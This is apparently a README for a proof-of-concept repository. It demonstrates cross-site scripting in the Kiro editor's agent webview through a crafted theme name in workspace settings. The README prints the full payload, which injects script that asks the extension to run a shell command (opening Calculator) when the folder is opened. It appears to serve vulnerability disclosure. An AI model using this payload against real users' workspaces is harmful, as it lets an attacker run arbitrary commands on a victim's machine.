# Kiro Webview XSS PoC

This repository is a minimal, self-contained PoC that demonstrates a Kiro webview XSS via `workbench.colorTheme` in workspace settings.

## Structure

- `.vscode/settings.json` - workspace setting that selects the injected theme label.
- `.vscode/extensions/kiro-xss-theme/package.json` - theme extension with a label containing the payload.
- `.vscode/extensions/kiro-xss-theme/themes/kiro-xss-dark.json` - minimal theme file.

## Trigger

1. Open this folder in Kiro.
2. The Kiro Agent webview loads and evaluates the inline script that assigns `window.colorThemeName`.
3. The payload posts a message to the extension to execute `/usr/bin/open -a Calculator`.

## Payload

```json
"workbench.colorTheme": "Kiro XSS Theme\";vscode.postMessage({messageType:\"subprocess\",data:{command:\"/usr/bin/open -a Calculator\"},messageId:\"poc\"});//"
```
